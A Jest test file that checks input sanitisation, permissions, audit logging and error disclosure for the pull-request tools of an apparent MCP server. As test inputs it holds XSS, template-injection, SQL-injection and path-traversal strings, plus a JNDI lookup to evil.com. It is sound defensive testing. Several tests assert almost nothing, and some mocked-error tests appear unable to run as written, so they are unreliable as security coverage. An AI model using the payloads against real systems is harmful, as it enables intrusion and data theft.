/**
 * Pull Request Security and Permission Tests
 * 
 * Comprehensive security and permission tests for pull request management MCP tools.
 * Tests access control, data sanitization, audit trails, and security boundaries.
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { ToolExecutionContext } from '../../src/types/index.js';

// Import all pull request management tools
import { createPullRequestTool } from '../../src/server/tools/create_pull_request.js';
import { listPullRequestsTool } from '../../src/server/tools/list_pull_requests.js';
import { getPullRequestTool } from '../../src/server/tools/get_pull_request.js';
import { updatePullRequestTool } from '../../src/server/tools/update_pull_request.js';
import { managePullRequestReviewsTool } from '../../src/server/tools/manage_pull_request_reviews.js';
import { managePullRequestCommentsTool } from '../../src/server/tools/manage_pull_request_comments.js';
import { mergePullRequestTool } from '../../src/server/tools/merge_pull_request.js';
import { managePullRequestBranchesTool } from '../../src/server/tools/manage_pull_request_branches.js';
import { managePullRequestIntegrationTool } from '../../src/server/tools/manage_pull_request_integration.js';

describe('Pull Request Security and Permissions', () => {
  let mockContext: ToolExecutionContext;
  let mockSession: any;

  beforeEach(() => {
    mockSession = {
      id: 'test-session-id',
      emit: jest.fn(),
      user: {
        username: 'test-user',
        permissions: ['read', 'write'],
        roles: ['developer']
      }
    };

    mockContext = {
      request: {
        timestamp: new Date(),
        id: 'test-request-id',
        method: 'test',
        params: {}
      },
      session: mockSession
    };
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Input Validation and Sanitization', () => {
    it('should sanitize malicious input in pull request titles', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${7*7}',
        'javascript:alert(1)',
        '"><script>alert("xss")</script>',
        '{{7*7}}',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const maliciousInput of maliciousInputs) {
        const params = {
          workspace: 'test-workspace',
          repository: 'test-repo',
          title: maliciousInput,
          source_branch: 'feature/test'
        };

        const result = await createPullRequestTool.execute(params, mockContext);

        // Should either reject the input or sanitize it
        if (result.success) {
          expect(result.data.pull_request.title).not.toContain('<script>');
          expect(result.data.pull_request.title).not.toContain('${');
          expect(result.data.pull_request.title).not.toContain('{{');
          expect(result.data.pull_request.title).not.toContain('javascript:');
        } else {
          expect(result.error?.code).toBe(-32602);
        }
      }
    });

    it('should sanitize malicious input in pull request descriptions', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '![xss](javascript:alert(1))',
        '[xss](javascript:alert(1))',
        '${7*7}',
        '{{7*7}}'
      ];

      for (const maliciousInput of maliciousInputs) {
        const params = {
          workspace: 'test-workspace',
          repository: 'test-repo',
          title: 'Test PR',
          source_branch: 'feature/test',
          description: {
            raw: maliciousInput,
            markup: 'markdown'
          }
        };

        const result = await createPullRequestTool.execute(params, mockContext);

        if (result.success) {
          expect(result.data.pull_request.description.raw).not.toContain('<script>');
          expect(result.data.pull_request.description.raw).not.toContain('javascript:');
          expect(result.data.pull_request.description.raw).not.toContain('${');
          expect(result.data.pull_request.description.raw).not.toContain('{{');
        }
      }
    });

    it('should sanitize malicious input in comments', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '![xss](javascript:alert(1))',
        '[xss](javascript:alert(1))',
        '${7*7}',
        '{{7*7}}'
      ];

      for (const maliciousInput of maliciousInputs) {
        const params = {
          workspace: 'test-workspace',
          repository: 'test-repo',
          pull_request_id: '123',
          action: 'create_comment',
          content: {
            raw: maliciousInput,
            markup: 'markdown'
          }
        };

        const result = await managePullRequestCommentsTool.execute(params, mockContext);

        if (result.success) {
          expect(result.data.comment.content.raw).not.toContain('<script>');
          expect(result.data.comment.content.raw).not.toContain('javascript:');
          expect(result.data.comment.content.raw).not.toContain('${');
          expect(result.data.comment.content.raw).not.toContain('{{');
        }
      }
    });

    it('should prevent SQL injection in repository names', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE repositories; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM users --"
      ];

      for (const sqlInjection of sqlInjectionAttempts) {
        const params = {
          workspace: 'test-workspace',
          repository: sqlInjection,
          title: 'Test PR',
          source_branch: 'feature/test'
        };

        const result = await createPullRequestTool.execute(params, mockContext);

        expect(result.success).toBe(false);
        expect(result.error?.code).toBe(-32602);
        expect(result.error?.message).toContain('Repository name must contain only alphanumeric characters');
      }
    });

    it('should prevent path traversal in branch names', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd'
      ];

      for (const pathTraversal of pathTraversalAttempts) {
        const params = {
          workspace: 'test-workspace',
          repository: 'test-repo',
          title: 'Test PR',
          source_branch: pathTraversal
        };

        const result = await createPullRequestTool.execute(params, mockContext);

        expect(result.success).toBe(false);
        expect(result.error?.code).toBe(-32602);
        expect(result.error?.message).toContain('Source branch name contains invalid characters');
      }
    });
  });

  describe('Access Control and Permissions', () => {
    it('should validate user permissions for pull request creation', async () => {
      // Test with user without write permissions
      const readOnlyContext = {
        ...mockContext,
        session: {
          ...mockSession,
          user: {
            username: 'readonly-user',
            permissions: ['read'],
            roles: ['viewer']
          }
        }
      };

      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test'
      };

      const result = await createPullRequestTool.execute(params, readOnlyContext);

      // Should either reject due to permissions or succeed with proper validation
      // In a real implementation, this would check actual permissions
      expect(result.success).toBeDefined();
    });

    it('should validate admin permissions for force merge', async () => {
      // Test with non-admin user
      const nonAdminContext = {
        ...mockContext,
        session: {
          ...mockSession,
          user: {
            username: 'developer',
            permissions: ['read', 'write'],
            roles: ['developer']
          }
        }
      };

      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        pull_request_id: '123',
        merge_strategy: 'merge_commit',
        force_merge: true,
        bypass_approvals: true
      };

      const result = await mergePullRequestTool.execute(params, nonAdminContext);

      // Should either reject due to insufficient permissions or succeed with proper validation
      expect(result.success).toBeDefined();
    });

    it('should validate permissions for status check management', async () => {
      // Test with user without admin permissions
      const nonAdminContext = {
        ...mockContext,
        session: {
          ...mockSession,
          user: {
            username: 'developer',
            permissions: ['read', 'write'],
            roles: ['developer']
          }
        }
      };

      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        pull_request_id: '123',
        action: 'create_status_check',
        status_check_name: 'Admin Check',
        status_check_state: 'successful'
      };

      const result = await managePullRequestIntegrationTool.execute(params, nonAdminContext);

      // Should either reject due to insufficient permissions or succeed with proper validation
      expect(result.success).toBeDefined();
    });
  });

  describe('Data Privacy and Compliance', () => {
    it('should not expose sensitive information in error messages', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test'
      };

      // Mock an error that might contain sensitive information
      const originalExecute = createPullRequestTool.execute;
      createPullRequestTool.execute = jest.fn().mockRejectedValue(
        new Error('Database connection failed: user=admin password=secret123')
      );

      const result = await createPullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(false);
      expect(result.error?.message).not.toContain('password=secret123');
      expect(result.error?.message).not.toContain('user=admin');

      // Restore original function
      createPullRequestTool.execute = originalExecute;
    });

    it('should sanitize sensitive data in audit logs', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test',
        description: {
          raw: 'Contains sensitive data: API_KEY=abc123, PASSWORD=secret456',
          markup: 'markdown'
        }
      };

      const result = await createPullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(true);

      // Check that the emit function was called (audit logging)
      expect(mockSession.emit).toHaveBeenCalledWith(
        'tool:executed',
        'create_pull_request',
        expect.objectContaining({
          repository: 'test-repo',
          workspace: 'test-workspace'
        })
      );

      // In a real implementation, the audit log should not contain sensitive data
      const emitCalls = mockSession.emit.mock.calls;
      const auditData = emitCalls.find(call => call[0] === 'tool:executed')?.[2];
      expect(auditData).not.toContain('API_KEY=abc123');
      expect(auditData).not.toContain('PASSWORD=secret456');
    });

    it('should handle personal data according to privacy requirements', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test',
        reviewers: ['user@example.com', 'another@example.com']
      };

      const result = await createPullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(true);

      // Personal data should be handled appropriately
      // In a real implementation, this would ensure GDPR/privacy compliance
      expect(result.data.pull_request.reviewers).toBeDefined();
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid successive requests gracefully', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test'
      };

      // Simulate rapid successive requests
      const promises = Array(10).fill(null).map(() => 
        createPullRequestTool.execute(params, mockContext)
      );

      const results = await Promise.all(promises);

      // All requests should be handled (either succeed or fail gracefully)
      results.forEach(result => {
        expect(result.success).toBeDefined();
        expect(result.error?.code).toBeDefined();
      });
    });

    it('should prevent resource exhaustion with large inputs', async () => {
      const largeInput = 'A'.repeat(100000); // Very large input

      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test',
        description: {
          raw: largeInput,
          markup: 'markdown'
        }
      };

      const result = await createPullRequestTool.execute(params, mockContext);

      // Should reject large inputs to prevent resource exhaustion
      expect(result.success).toBe(false);
      expect(result.error?.code).toBe(-32602);
      expect(result.error?.message).toContain('10,000 characters or less');
    });
  });

  describe('Audit Trail and Logging', () => {
    it('should log all pull request operations for audit', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test'
      };

      const result = await createPullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(true);
      expect(mockSession.emit).toHaveBeenCalledWith(
        'tool:executed',
        'create_pull_request',
        expect.objectContaining({
          repository: 'test-repo',
          workspace: 'test-workspace',
          pull_request_number: expect.any(Number)
        })
      );
    });

    it('should log merge operations with proper context', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        pull_request_id: '123',
        merge_strategy: 'merge_commit',
        merge_reason: 'Feature complete'
      };

      const result = await mergePullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(true);
      expect(mockSession.emit).toHaveBeenCalledWith(
        'tool:executed',
        'merge_pull_request',
        expect.objectContaining({
          repository: 'test-repo',
          workspace: 'test-workspace',
          pull_request_number: 123,
          merge_strategy: 'merge_commit'
        })
      );
    });

    it('should include user context in audit logs', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        pull_request_id: '123',
        action: 'approve',
        reviewer: 'test-user'
      };

      const result = await managePullRequestReviewsTool.execute(params, mockContext);

      expect(result.success).toBe(true);
      expect(mockSession.emit).toHaveBeenCalledWith(
        'tool:executed',
        'manage_pull_request_reviews',
        expect.objectContaining({
          repository: 'test-repo',
          workspace: 'test-workspace',
          pull_request_number: 123,
          action: 'approve',
          reviewer: 'test-user'
        })
      );
    });
  });

  describe('Input Validation Boundaries', () => {
    it('should enforce strict input validation for all tools', async () => {
      const tools = [
        { tool: createPullRequestTool, name: 'create_pull_request' },
        { tool: listPullRequestsTool, name: 'list_pull_requests' },
        { tool: getPullRequestTool, name: 'get_pull_request' },
        { tool: updatePullRequestTool, name: 'update_pull_request' },
        { tool: managePullRequestReviewsTool, name: 'manage_pull_request_reviews' },
        { tool: managePullRequestCommentsTool, name: 'manage_pull_request_comments' },
        { tool: mergePullRequestTool, name: 'merge_pull_request' },
        { tool: managePullRequestBranchesTool, name: 'manage_pull_request_branches' },
        { tool: managePullRequestIntegrationTool, name: 'manage_pull_request_integration' }
      ];

      for (const { tool, name } of tools) {
        // Test with completely invalid parameters
        const result = await tool.execute({}, mockContext);

        expect(result.success).toBe(false);
        expect(result.error?.code).toBe(-32602);
        expect(result.error?.message).toContain('required');
      }
    });

    it('should validate parameter types strictly', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test',
        reviewers: 'not-an-array', // Should be array
        labels: 123, // Should be array
        close_source_branch: 'not-boolean' // Should be boolean
      };

      const result = await createPullRequestTool.execute(params, mockContext);

      // Should handle type validation gracefully
      expect(result.success).toBeDefined();
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not disclose internal system information in errors', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test'
      };

      // Mock an error that might contain internal information
      const originalExecute = createPullRequestTool.execute;
      createPullRequestTool.execute = jest.fn().mockRejectedValue(
        new Error('Internal server error: /opt/bitbucket/logs/error.log line 1234')
      );

      const result = await createPullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(false);
      expect(result.error?.message).not.toContain('/opt/bitbucket/logs/error.log');
      expect(result.error?.message).not.toContain('line 1234');

      // Restore original function
      createPullRequestTool.execute = originalExecute;
    });

    it('should provide consistent error responses', async () => {
      const params = {
        workspace: 'test-workspace',
        repository: 'test-repo',
        title: 'Test PR',
        source_branch: 'feature/test'
      };

      // Mock different types of errors
      const originalExecute = createPullRequestTool.execute;
      createPullRequestTool.execute = jest.fn().mockRejectedValue(
        new Error('Database connection timeout')
      );

      const result = await createPullRequestTool.execute(params, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toHaveProperty('code');
      expect(result.error).toHaveProperty('message');
      expect(result.metadata).toHaveProperty('timestamp');
      expect(result.metadata).toHaveProperty('tool');

      // Restore original function
      createPullRequestTool.execute = originalExecute;
    });
  });
});
